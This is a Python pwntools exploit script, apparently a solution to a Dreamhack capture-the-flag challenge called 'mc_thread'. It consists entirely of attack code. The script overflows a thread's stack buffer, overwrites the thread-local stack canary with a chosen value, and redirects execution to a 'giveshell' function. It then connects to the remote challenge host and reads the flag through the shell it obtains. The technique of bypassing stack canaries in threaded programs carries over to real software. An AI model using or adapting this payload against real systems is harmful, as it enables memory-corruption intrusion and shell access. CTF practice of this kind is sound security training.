#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 16890
HOST = "host8.dreamhack.games"
exe = context.binary = ELF('./mc_thread_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-linux-x86-64.so.2', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            b* 0x000000000040139C
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()


# VARIABLE

# PAYLOAD
payload = flat(
    b'a'*264,
    b'12345678', # canary
    b'a'*8,
    exe.sym.giveshell,
    b'a'*254*8,
    exe.got.read, # *pthread_t (fs + 0x10)
    b'a'*0x10,
    b'12345678', # (fs + 0x28)
    )
p.sendlineafter(b'Size: ', str(len(payload)//8))
# GDB()
p.sendafter(b'Data: ', payload)
p.sendline(b'cat flag')

p.interactive()